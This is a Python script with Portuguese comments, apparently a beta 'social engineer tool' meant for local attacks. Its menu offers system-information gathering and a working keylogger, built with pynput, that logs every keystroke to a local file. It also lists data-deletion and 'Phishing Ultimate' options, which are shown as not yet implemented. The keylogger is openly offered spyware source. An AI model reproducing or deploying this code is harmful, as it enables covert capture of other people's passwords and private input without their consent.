import os
import time
import subprocess
from tqdm import tqdm
from pynput import keyboard
import random
import shutil
# Barra de progresso para simulação de carregamento
def show_progress():
    for _ in tqdm(range(10), desc="CONFIGURANDO..."):
        time.sleep(0.2)

# Função para obter informações do sistema
def get_system_info():
    print("Obtendo informações do sistema...")
    time.sleep(1)
    try:
        system_info = subprocess.run("systeminfo", shell=True, text=True, capture_output=True)
        if system_info.returncode == 0:
            print(system_info.stdout)
            with open("system_info.txt", "w") as logs:
                logs.write(system_info.stdout)
                print("Logs guardados em 'system_info.txt'")
        else:
            print("Erro ao obter informações do sistema.")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

# Função para iniciar o keylogger
def start_keylogger():
    print("Iniciando keylogger...")

    def on_key_press(key):
        try:
            with open("keyfile.txt", 'a') as log_file:
                log_file.write(str(key.char))
        except AttributeError:  # Para teclas especiais (como shift, enter, etc.)
            with open("keyfile.txt", 'a') as log_file:
                log_file.write(f"[{key}]")

    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    print("Keylogger iniciado. Pressione Ctrl+C para parar.")
    listener.join()
   
# Menu de opções
def menu():
    option = """

Versao Beta do SET (SOCIAL ENGINNER TOOL) Para ataques locais
    Author: Easymoneydoc
    by:Velcher

                _____
                
               |0    0
               |
               ++++++
                 ___
               **********
AVISO! os logs de cada ataque realizado encontra se localizado no diretorio do programa[.txt], mas voce pode personalizalo se quiser!

    [1] System Info     [Info. Sistema]
    [2] Install Keylogs [Rastreador de teclados]
    [3] Delete Any Data [Apagar qualquer arquivo]
    [4] Phishing Ultimate 
    """
    print(option)

# Execução principal
def main():
    show_progress()
    menu()
    try:
        escolha = int(input("Escolha: "))
        if escolha == 1:
            get_system_info()
        elif escolha == 2:
            start_keylogger()
        elif escolha == 3:
            print("Função de [Delete Any File] ainda não implementada.")
        elif escolha == 4:
            print("Função de Phishing Ultimate ainda não implementada.")
        else:
            print("Opção inválida! Tente novamente.")
    except ValueError:
        print("Erro: Por favor, insira um número válido.")
    except KeyboardInterrupt:
        print("\nPrograma encerrado pelo usuário.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")

# Executar o programa
if __name__ == "__main__":
    main()

